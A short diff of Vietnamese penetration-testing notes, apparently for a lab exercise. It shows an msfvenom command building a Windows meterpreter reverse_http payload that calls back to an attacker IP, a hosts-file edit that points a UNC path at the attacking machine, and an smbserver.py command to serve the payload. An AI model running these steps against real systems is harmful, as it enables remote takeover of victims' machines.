@@ -11,7 +11,13 @@ Lưu ý chụp lại các đoạn có IP của máy Debug sau khi đã khai thá
 $ msfvenom -p windows/meterpreter/reverse_http HOST=192.168.45.178 LPORT=4343 -f exe -o met.exe
 ```
 
-Để tạo SMB server
+Thay đổi file hosts trên máy Windows để tạo kết nối UNC sang máy tấn công.  
+Dùng notepad để thêm 1 dòng trong file hosts.
+```
+<Địa chỉ IP>      kali
+```
+
+Để tạo SMB server ([Nếu không có lệnh smbserver.py]())
 ```
 sudo smbserver.py met /home/kali/ -smb2support
 ```
